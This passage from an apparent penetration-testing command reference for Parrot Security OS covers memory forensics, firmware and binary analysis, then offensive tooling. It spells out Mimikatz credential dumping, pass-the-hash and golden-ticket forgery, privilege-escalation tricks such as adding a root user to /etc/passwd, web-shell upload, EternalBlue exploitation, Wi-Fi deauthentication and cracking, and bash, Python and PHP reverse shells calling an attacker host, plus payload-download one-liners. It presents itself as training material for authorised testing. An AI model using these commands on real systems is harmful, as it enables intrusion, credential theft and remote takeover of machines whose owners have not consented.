        2 of ($str*) or $hex1              // Match if 2+ string matches OR hex pattern
}
```

---

## 28. Volatility — Memory Forensics

**What is Volatility?**
When a computer is running, its RAM contains: running processes, network connections, decrypted files, passwords, encryption keys, malware in memory. Volatility analyzes RAM dump files to extract all of this.

```bash
volatility -f memory.dmp imageinfo
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-f memory.dmp` | Memory dump file | The RAM image file to analyze |
| `imageinfo` | Identify OS profile | Determines what Windows version/service pack created this dump. MUST RUN FIRST to get the `--profile` value for all other commands. |

**Output:** `Suggested Profile(s): Win7SP1x64` — use this in every subsequent command.

---

```bash
volatility -f memory.dmp --profile=Win7SP1x64 pslist
```
WHY: List ALL running processes at the time of memory capture. Shows PID, PPID (parent), name, start time. Look for: suspicious process names, malware running as system processes, hidden processes.

```bash
volatility -f memory.dmp --profile=Win7SP1x64 pstree
```
WHY: Same as pslist but shows PARENT-CHILD relationships as a tree. Suspicious: `word.exe` spawning `cmd.exe` (macro malware), `explorer.exe` directly spawning `powershell.exe`.

```bash
volatility -f memory.dmp --profile=Win7SP1x64 netscan
```
WHY: Shows network connections at capture time — remote IPs, ports, connection state. Find C2 (Command & Control) server connections from malware.

```bash
volatility -f memory.dmp --profile=Win7SP1x64 hashdump
```
WHY: Extracts Windows password hashes from memory — often possible even without being admin, because the hashes are in memory.

```bash
volatility -f memory.dmp --profile=Win7SP1x64 malfind
```
WHY: Finds injected code — memory regions with execute+write permissions that don't map to a file on disk. Classic sign of process injection malware.

```bash
volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles -Q 0x12345678 --dump-dir=/tmp/
```
WHY: Extract actual files from memory at a given address. Recover malware samples, encrypted files, and documents that were open at the time.

---

## 29. Binwalk — Firmware Analysis

```bash
binwalk firmware.bin
```
WHY: Identifies file types embedded inside the binary — compressed archives, filesystems, executables, certificates. Shows offset (where in the file) and type.

**Output:**
```
DECIMAL   HEXADECIMAL   DESCRIPTION
0         0x0           JFFS2 filesystem
123456    0x1E240       LZMA compressed data
456789    0x6F8D5       gzip compressed data
```

```bash
binwalk -e firmware.bin
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-e` | Extract | Automatically extracts all identified files to `_firmware.bin.extracted/` folder. Lets you browse the router's filesystem! |

```bash
binwalk -M firmware.bin
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-M` | Matryoshka (recursive) | Extract files, then extract files inside those files. Handles nested compression. |

```bash
binwalk --entropy firmware.bin
```
WHY: Plots entropy (randomness) across the file. High entropy = encrypted/compressed data. Low entropy = plaintext data. Helps identify where interesting readable content is.

**What to look for in extracted firmware:**
```
/etc/passwd          → Default credentials
/etc/shadow          → Password hashes
/etc/config/         → Device configuration
hardcoded strings:   grep -r "password\|secret\|admin" extracted/
SSL private keys:    find extracted/ -name "*.key" -o -name "*.pem"
```

---

## 30. Ghidra — Reverse Engineering

**What is Ghidra?**
Ghidra takes a compiled binary (EXE, ELF, APK) and converts machine code back to human-readable C-like pseudocode. Used to: analyze malware, find vulnerabilities in closed-source software, understand how software works without source code.

**Key Ghidra windows:**
```
Symbol Tree (left)     → Lists all functions, labels, imports, exports
                         Click function name → jumps to it in disassembly

Listing (center)       → Assembly code view
                         Each line = one CPU instruction

Decompiler (right)     → C pseudocode — much more readable than assembly
                         THIS is what you'll spend most time in

Data Type Manager      → Shows all identified data structures

References panel       → What calls this function? What does this function call?
```

**Navigating Ghidra:**
```
Double-click function name   → Go to that function's code
Right-click → References     → See all callers/callees
Right-click → Rename         → Give meaningful names to variables
Right-click → Retype variable → Correct data type
G key                        → Go to address
Ctrl+F                       → Search for strings
L key                        → Create label/rename
```

**Finding interesting code:**
```
Functions to look for:
→ main() / entry()           Start here — program entry point
→ Functions calling strcmp()  Often password/key comparisons
→ Functions calling fopen()   File operations
→ Functions calling socket()  Network communication
→ Functions calling system()  OS command execution (command injection?)
→ Any function named check_password, validate, authenticate
```

---

## 31. Rizin / Cutter — Binary Analysis

```bash
rizin -A binary
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-A` | Auto-analyze on open | Runs all analysis functions automatically. Required first step to identify functions, strings, imports. Without `-A`, just raw bytes. |

**Inside rizin — most important commands:**
```bash
aa          # Analyze All — finds all functions (same as -A flag)
            # WHY: Populates function list so you can navigate

afl         # Analyze Functions List
            # WHY: Shows all identified functions with addresses
            # Output: 0x00401234   14   67  main
            #         address   calls  size  name

pdf @ main  # Print Disassembly of Function "main"
            # WHY: Shows assembly of main function
            # @ = at this location

s main      # Seek to 'main'
            # WHY: Move cursor to main function address

s 0x00401234  # Seek to specific address
              # WHY: Jump to any location in binary

iz          # List Strings
            # WHY: Find hardcoded strings — passwords, URLs, error messages, keys
            # Often reveals: "Enter password: " "Incorrect!" "admin:password123"

ii          # List Imports
            # WHY: See what external functions the binary calls
            # system(), execve() = command execution
            # socket(), connect() = network activity
            # fopen() = file access

iS          # List Sections
            # WHY: .text = code, .data = initialized data, .rodata = constants

axt @ sym.check_password
            # Find cross-references TO check_password function
            # WHY: Find what code calls the password check = find authentication logic

V           # Enter Visual mode
            # WHY: Navigable display — arrow keys, easier to read
            # Press 'p' to cycle views (hex/disasm/debug)

q           # Quit rizin
```

---

## 32. Mimikatz — Credential Dumping

**What is Mimikatz?**
Windows stores credentials in memory (LSASS process) in various forms. Mimikatz extracts them. Created by Benjamin Delpy as a proof-of-concept — now the most feared post-exploitation tool in Windows environments.

**Via Metasploit Meterpreter (most common):**
```bash
meterpreter> load kiwi    # Load Kiwi (Mimikatz port)
# WHY: Loads Mimikatz functionality into Meterpreter session

meterpreter> creds_all
# WHY: Dumps ALL credential types in one command:
#      Plaintext passwords (if WDigest enabled)
#      NTLM hashes
#      Kerberos tickets
#      DPAPI master keys

meterpreter> lsa_dump_sam
# WHY: Dumps SAM (Security Account Manager) database
#      Contains NTLM hashes for ALL local Windows users
#      Use hashes for Pass-the-Hash or offline cracking

meterpreter> lsa_dump_secrets
# WHY: Dumps LSA (Local Security Authority) secrets
#      Contains: cached domain credentials, service account passwords,
#      computer account passwords, VPN credentials
```

**Standalone Windows commands:**
```
privilege::debug          
# WHY: Request SeDebugPrivilege
#      REQUIRED before most Mimikatz commands
#      Allows access to other processes' memory (like LSASS)
#      Must run as Administrator

sekurlsa::logonpasswords  
# WHY: MAIN COMMAND — dumps credentials of all logged-in users
#      If WDigest enabled (Windows < 8.1, old Server): shows PLAINTEXT passwords
#      Always shows: NTLM hashes, Kerberos tickets

sekurlsa::pth /user:Administrator /domain:target.local /ntlm:HASH /run:cmd.exe
# WHY: Pass-the-Hash — start cmd.exe as Administrator using hash (not password)
#      Creates new process with stolen credentials

kerberos::list
# WHY: List all Kerberos tickets in current session

kerberos::golden /user:Admin /domain:target.local /sid:S-1-5-... /krbtgt:HASH
# WHY: Create Golden Ticket — forge a Kerberos TGT for ANY user
#      With krbtgt hash = permanent domain admin access
#      Persists even after password changes
```

---

## 33. LinPEAS / WinPEAS — Privilege Escalation

**What is PEASS?**
After getting a shell on a target, you often start as a low-privilege user. PEASS scripts automatically check hundreds of privilege escalation vectors and color-code results by severity (red = critical = exploitable now).

```bash
# Download and run LinPEAS immediately (no file saved):
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Save to file then run:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee /tmp/linpeas_output.txt
# tee saves output while also showing it live
```

**Understanding LinPEAS color output:**
```
RED/YELLOW  = 95% chance of privilege escalation — check these FIRST
RED         = Highly probable privesc vector
YELLOW      = Interesting — worth manual investigation  
GREEN       = Good security practice (not a finding)
BLUE        = Info (neutral)
```

**What LinPEAS checks (key categories):**
```
System Info:     OS version, kernel version (check for kernel exploits)
Users:           sudo -l output, .ssh keys, passwd writable?
Interesting Files: SUID binaries, world-writable paths, cron jobs
Software:        Installed software with known privesc vulnerabilities
Network:         Internal ports (pivot points), firewall rules
Containers:      Docker socket accessible? (instant root)
Password files:  .bash_history, config files with passwords
Capabilities:    cap_setuid on binaries (equals SUID)
```

**Most important LinPEAS findings to exploit:**
```
SUID binary not in default list:
→ Check gtfobins.github.io for that binary
→ Example: find / -perm -4000 shows "/usr/bin/vim" with SUID
→ GTFOBins: vim -c ':!/bin/sh' → instant root shell

Writable cron job:
→ Add your command to the cron script
→ Wait for cron to run → runs as root

sudo -l shows:
→ (ALL) NOPASSWD: /usr/bin/vim → can run vim as root → escape to shell
→ Check GTFOBins for every listed binary

Writable /etc/passwd:
→ Add new root user: echo 'hacker::0:0:hacker:/root:/bin/bash' >> /etc/passwd
→ su hacker → instant root

Docker socket:
→ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
→ Mounts host root filesystem → instant root
```

---

## 34. SSH — Secure Shell

```bash
ssh user@192.168.1.100
```
WHY: Connect to remote machine's command line over encrypted connection.

```bash
ssh -p 2222 user@target.com
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-p 2222` | Port 2222 | Target runs SSH on non-standard port (common for security through obscurity) |

```bash
ssh -i ~/.ssh/id_rsa user@target.com
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-i ~/.ssh/id_rsa` | Identity file (private key) | Authenticate with SSH key instead of password. More secure. Required when server only accepts key auth. |

```bash
ssh -L 8080:internal.server:80 user@jump.server
```
| Flag | Meaning | WHY (Local Port Forward) |
|------|---------|--------------------------|
| `-L 8080:internal.server:80` | Local forward | Creates tunnel: YOUR port 8080 → through jump.server → to internal.server:80. Now `http://localhost:8080` shows internal server's website that's otherwise unreachable. |

```bash
ssh -R 4444:localhost:4444 user@attacker.com
```
| Flag | Meaning | WHY (Remote Port Forward) |
|------|---------|--------------------------|
| `-R 4444:localhost:4444` | Remote forward | Creates reverse tunnel: attacker.com:4444 → through SSH → to localhost:4444. Useful when victim can SSH out but you can't SSH in. |

```bash
ssh -D 1080 user@server
```
| Flag | Meaning | WHY (Dynamic SOCKS Proxy) |
|------|---------|--------------------------|
| `-D 1080` | Dynamic port forward | Creates SOCKS5 proxy on localhost:1080. Route any tool through this to reach the server's network. |

```bash
ssh -N -f -L 8080:192.168.1.100:80 user@jump
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-N` | No command | Don't run a command, just forward. Stays open without shell. |
| `-f` | Background | Fork to background after connecting. Free your terminal. |

---

## 35. GPG / Cryptography

```bash
gpg --gen-key
```
WHY: Generate your own PGP key pair (public + private). Public key = share with others so they can encrypt messages TO you. Private key = keep SECRET, used to decrypt messages.

```bash
gpg --encrypt -r recipient@email.com file.txt
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `--encrypt` | Encrypt the file | Creates file.txt.gpg |
| `-r recipient@email.com` | Recipient | Encrypt using THEIR public key. Only they can decrypt with their private key. |

```bash
gpg --decrypt file.txt.gpg
```
WHY: Decrypt file encrypted with YOUR public key. Requires YOUR private key.

```bash
gpg --sign document.txt
```
WHY: Creates cryptographic signature proving YOU created this document. Others can verify with your public key.

```bash
openssl s_client -connect target.com:443
```
WHY: Test SSL/TLS connection. Shows: certificate chain, cipher suite used, TLS version. Useful for checking for weak TLS configs.

```bash
openssl x509 -in cert.pem -text -noout
```
WHY: Read and display certificate details: issuer, subject, validity dates, SANs.

```bash
openssl dgst -sha256 file.txt
```
WHY: Generate SHA256 hash of a file. Verify file integrity — compare hash before/after transfer.

---

## 36. Git — Version Control

```bash
git clone https://github.com/author/tool.git
```
WHY: Download a security tool from GitHub with full history.

```bash
git clone --depth 1 https://github.com/author/tool.git
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `--depth 1` | Shallow clone | Only download latest version, no history. Much faster for large repos when you just need the current code. |

```bash
git pull
```
WHY: Update an already-cloned tool to the latest version. Run before using tools to get newest features and bug fixes.

```bash
git log --oneline --graph
```
WHY: See commit history as a visual graph. Useful for understanding when changes were made to tools.

**Finding secrets in Git repos:**
```bash
git log --all --oneline    # See all commits including deleted branches
git show COMMIT_HASH       # See what changed in a specific commit
git diff HEAD~1 HEAD       # Compare last two commits
# WHY: Developers sometimes commit passwords/keys then delete them.
#      The commit history still contains the sensitive data.
```

---

## 37. Python3 — Scripting

**Why Python is essential for security:**
Python is used for: writing custom exploits, automating repetitive tasks, processing captured data, creating tools, and rapid prototyping.

```bash
python3 -c "print('Hello')"
```
WHY: Run Python one-liner from command line. Quick calculations, encoding, decoding.

```bash
python3 -c "import base64; print(base64.b64decode('SGVsbG8=').decode())"
```
WHY: Decode base64 from command line without extra tools.

```bash
python3 -m http.server 8080
```
| Part | Meaning | WHY (Security Essential!) |
|------|---------|--------------------------|
| `-m http.server` | Run built-in HTTP server module | Instantly serves files from current directory on port 8080. |
| `8080` | Port | |

WHY: When you need to transfer files to a compromised machine: start server on YOUR machine → victim downloads via `wget http://YOUR_IP:8080/tool.exe` or `curl`. No setup required.

```bash
python3 -m http.server 80
sudo python3 -m http.server 80   # Port 80 needs root
```

```bash
python3 exploit.py 192.168.1.100 8080
```
WHY: Run Python exploit scripts downloaded from ExploitDB or GitHub.

**Quick Python for security tasks:**
```python
# Decode base64 (common in CTFs and malware)
import base64
base64.b64decode("SGVsbG8gV29ybGQ=")

# URL encode/decode
from urllib.parse import quote, unquote
quote("' OR 1=1--")     # → %27%20OR%201%3D1--
unquote("%27%20OR%201%3D1--")  # → ' OR 1=1--

# XOR encryption (common in CTFs)
data = bytes([0x41, 0x42, 0x43])
key = 0x20
result = bytes([b ^ key for b in data])

# Generate reverse shell payload
import socket, subprocess, os
# Run on target:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

---

## 38. Linux Essential Commands

**Why Linux commands matter for hackers:**
After getting a shell, you need to navigate the system quickly. These are the most critical commands for post-exploitation.

```bash
whoami && id && hostname && ip a && uname -a
```
WHY: First thing after getting a shell — one line that tells you: current user, groups (am I in sudo/docker/etc?), machine name, IP addresses, OS/kernel version. Copy this output into your notes.

```bash
find / -perm -4000 2>/dev/null
```
| Part | Meaning | WHY |
|------|---------|-----|
| `find /` | Search from root | Check entire filesystem |
| `-perm -4000` | SUID bit set | Files that run as their OWNER (often root) regardless of who executes them |
| `2>/dev/null` | Suppress errors | Redirect "Permission denied" messages to /dev/null — cleans output |

WHY: SUID binaries are a classic privesc vector. If any non-standard binary has SUID, check GTFOBins.

```bash
sudo -l
```
WHY: Shows what commands current user can run as root via sudo. Any entry = potential privilege escalation. Check each at GTFOBins.

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```
WHY: List users with actual shells (can log in). Focus your cracking/escalation on these accounts.

```bash
cat /etc/crontab && ls -la /etc/cron*
```
WHY: Check cron jobs. A cron job running as root that uses a script you can modify = instant root.

```bash
ps aux
```
WHY: List all running processes. Look for: running as root processes you can interact with, unusual processes, processes with interesting file paths.

```bash
netstat -tulnp
ss -tulnp
```
WHY: List all listening ports. Often reveals internal services (databases, admin panels) not exposed externally — accessible by pivoting.

```bash
env
```
WHY: Print environment variables. Often reveals: secret keys, passwords, API tokens, database credentials stored in environment.

```bash
history
cat ~/.bash_history
```
WHY: Command history often contains: passwords typed on command line, hostnames, file paths with sensitive data, previously used credentials.

```bash
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null
```
WHY: Search all config files for passwords. Web apps, databases, and services often store credentials in config files.

```bash
ls -la ~/.ssh/
```
WHY: Check for SSH private keys. `id_rsa` without passphrase = can SSH to other machines as this user. Check `authorized_keys` to see what other machines trust this key.

---

## 39. Complete Attack Flow Examples

### 🎯 Example 1: Web Application Attack (Beginner)

```bash
# Step 1: Find what's running
nmap -sV -sC -p 80,443,8080 target.htb
# WHY: Discover web services and their versions before testing

# Step 2: Find hidden directories
gobuster dir -u http://target.htb \
             -w /usr/share/seclists/Discovery/Web-Content/common.txt \
             -x php,html,txt -t 30
# WHY: Find admin panels, upload pages, config files

# Step 3: Scan for common vulnerabilities
nikto -h http://target.htb
# WHY: Quick automated check for known issues

# Step 4: Intercept and test with Burp Suite
# Set Firefox proxy to 127.0.0.1:8080
# Browse the site → Burp logs all requests
# Find a form with parameters → Test for SQLi

# Step 5: Test SQL injection
sqlmap -u "http://target.htb/page?id=1" --dbs --batch
# WHY: Automated SQLi testing on discovered parameter

# Step 6: Dump credentials
sqlmap -u "http://target.htb/page?id=1" -D webapp -T users --dump --batch
# WHY: Extract usernames and password hashes

# Step 7: Crack hashes
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# WHY: Convert hashes to plaintext passwords

# Step 8: Login and escalate
# Use cracked credentials to access admin panel
# Find file upload → upload PHP web shell
weevely generate pass123 /tmp/shell.php
# Upload shell.php → connect:
weevely http://target.htb/uploads/shell.php pass123
```

---

### 🎯 Example 2: Network Attack (Intermediate)

```bash
# Step 1: Full network scan
sudo nmap -sS -sV -sC -O -p- --min-rate 5000 \
          -oA full_scan 10.10.10.40
# WHY: Comprehensive scan saved to all formats

# Step 2: Check for EternalBlue (if Windows SMB found)
nmap --script=smb-vuln-ms17-010 10.10.10.40
# WHY: Quick check before loading Metasploit

# Step 3: Exploit with Metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5         # Your VPN IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
# WHY: Automated exploitation of known vulnerability

# Step 4: Post-exploitation
getsystem                     # Escalate to SYSTEM
getuid                        # Confirm SYSTEM
hashdump                      # Dump all hashes
# WHY: Establish dominance, collect credentials

# Step 5: Crack or use hashes
# Crack: hashcat -m 1000 hashes.txt rockyou.txt
# OR Pass-the-Hash directly:
psexec.py -hashes :NTLM_HASH administrator@10.10.10.40

# Step 6: Persistence check
run post/multi/recon/local_exploit_suggester
# WHY: Find additional privilege escalation paths
```

---

### 🎯 Example 3: Wi-Fi Audit (Complete)

```bash
# Step 1: Prepare adapter
sudo airmon-ng check kill        # Kill interfering processes
sudo airmon-ng start wlan0       # Enable monitor mode → wlan0mon

# Step 2: Survey networks  
sudo airodump-ng wlan0mon
# WHY: See all nearby APs, note TARGET's BSSID and channel

# Step 3: Capture handshake
sudo airodump-ng -c 6 \
                 --bssid AA:BB:CC:DD:EE:FF \
                 -w capture wlan0mon
# WHY: Lock to target channel, capture only target traffic

# Step 4: Force client reconnect (in new terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# WHY: Send 5 deauth packets → client reconnects → handshake captured

# Step 5: Verify handshake captured
# Watch airodump-ng output for: "WPA handshake: AA:BB:CC:DD:EE:FF"

# Step 6: Crack the handshake
# Method A — CPU (slower):
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Method B — GPU (much faster):
hashcat -m 22000 capture.hc22000 rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule
# WHY: Rule-based attack finds passwords like "Admin2024!" that dictionary alone misses

# Step 7: Restore normal mode
sudo airmon-ng stop wlan0mon
sudo service NetworkManager restart
```

---

## 40. Command Quick Reference Card

### 🃏 One-Page Cheat Sheet

```
═══════════════════════════════════════════════════════════════
                    NMAP QUICK REFERENCE
═══════════════════════════════════════════════════════════════
Discovery:    nmap -sn 192.168.1.0/24          → Live hosts
Quick:        nmap -sV -sC -T4 TARGET          → Fast recon
Full:         nmap -sV -sC -p- --min-rate 5000 → All ports
Vuln:         nmap --script=vuln TARGET         → Vuln check
Save:         nmap [flags] TARGET -oA output    → All formats

═══════════════════════════════════════════════════════════════
                    METASPLOIT QUICK REFERENCE
═══════════════════════════════════════════════════════════════
Start:        sudo service postgresql start && msfconsole
Search:       search ms17-010
Use:          use exploit/windows/smb/ms17_010_eternalblue
Options:      show options
Set:          set RHOSTS TARGET && set LHOST YOURIP
Fire:         run -j
Sessions:     sessions -l / sessions -i 1

═══════════════════════════════════════════════════════════════
                    METERPRETER QUICK REFERENCE
═══════════════════════════════════════════════════════════════
Info:         sysinfo && getuid
Escalate:     getsystem
Hashes:       hashdump
Migrate:      migrate EXPLORER_PID
Shell:        shell
Keylog:       keyscan_start && keyscan_dump
Screenshot:   screenshot
Upload:       upload /local/file C:\\remote\\path
Download:     download C:\\file /local/

═══════════════════════════════════════════════════════════════
                   HASHCAT QUICK REFERENCE
═══════════════════════════════════════════════════════════════
MD5:          hashcat -m 0    hash.txt rockyou.txt
NTLM:         hashcat -m 1000 hash.txt rockyou.txt
Linux:        hashcat -m 1800 hash.txt rockyou.txt
WPA:          hashcat -m 22000 cap.hc22000 rockyou.txt
With rules:   hashcat -m 0 hash.txt rockyou.txt -r best64.rule
Brute 8chr:   hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a

═══════════════════════════════════════════════════════════════
                    GOBUSTER QUICK REFERENCE
═══════════════════════════════════════════════════════════════
Dirs:         gobuster dir -u URL -w common.txt -t 50 -x php,html
DNS:          gobuster dns -d domain.com -w subdomains.txt
VHost:        gobuster vhost -u URL -w subdomains.txt --append-domain

═══════════════════════════════════════════════════════════════
                    WIFI AUDIT QUICK REFERENCE
═══════════════════════════════════════════════════════════════
Prep:         airmon-ng check kill && airmon-ng start wlan0
Survey:       airodump-ng wlan0mon
Capture:      airodump-ng -c CH --bssid BSSID -w cap wlan0mon
Deauth:       aireplay-ng -0 10 -a BSSID wlan0mon
Crack:        aircrack-ng -w rockyou.txt capture-01.cap

═══════════════════════════════════════════════════════════════
                    POST-EXPLOITATION QUICK REFERENCE
═══════════════════════════════════════════════════════════════
First thing:  whoami && id && hostname && ip a && uname -a
SUID files:   find / -perm -4000 2>/dev/null
Sudo perms:   sudo -l
Cron jobs:    cat /etc/crontab && ls /etc/cron*
Listening:    ss -tulnp
History:      cat ~/.bash_history
LinPEAS:      curl -L .../linpeas.sh | sh

═══════════════════════════════════════════════════════════════
                    REVERSE SHELLS QUICK REFERENCE
═══════════════════════════════════════════════════════════════
Listen:       nc -lvnp 4444
Bash:         bash -i >& /dev/tcp/LHOST/4444 0>&1
Python:       python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
PHP:          php -r '$s=fsockopen("LHOST",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
Upgrade:      python3 -c 'import pty;pty.spawn("/bin/bash")'
Full TTY:     Ctrl+Z → stty raw -echo → fg → reset → export TERM=xterm

═══════════════════════════════════════════════════════════════
                    FILE TRANSFER QUICK REFERENCE
═══════════════════════════════════════════════════════════════
Server:       python3 -m http.server 8080
Linux get:    wget http://LHOST:8080/file || curl -O http://LHOST:8080/file
Windows get:  certutil -urlcache -f http://LHOST:8080/file.exe file.exe
            : powershell -c "Invoke-WebRequest http://LHOST:8080/file -OutFile file"
SCP:          scp file user@target:/path/
```

---

*🦜 Parrot Security OS Command Reference — Every flag explained*
*📚 Practice every command on: HackTheBox, TryHackMe, VulnHub*
*⚠️ For authorized security testing and education ONLY*
*🔐 Know your target, get permission, document everything*